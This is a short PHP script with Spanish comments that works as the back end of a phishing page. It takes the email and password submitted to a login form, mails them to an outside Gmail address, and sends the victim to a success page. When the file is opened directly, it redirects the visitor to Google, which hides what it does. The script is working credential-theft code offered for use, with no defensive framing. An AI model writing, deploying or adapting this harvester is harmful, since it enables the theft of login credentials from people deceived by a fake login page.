<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST["email"];
  $password = $_POST["password"];
  
  $to = "xerpesxd@gmail.com";
  $subject = "Login Details";
  $message = "Email: $email\nPassword: $password";
  
  // Envía el correo electrónico
  mail($to, $subject, $message);
  
  // Redirige al usuario a una página de éxito
  header("Location: success.html");
} else {
  // Si se accede directamente a este archivo, redirige al usuario a la página de login
  header("Location: https://www.google.com");
}
?>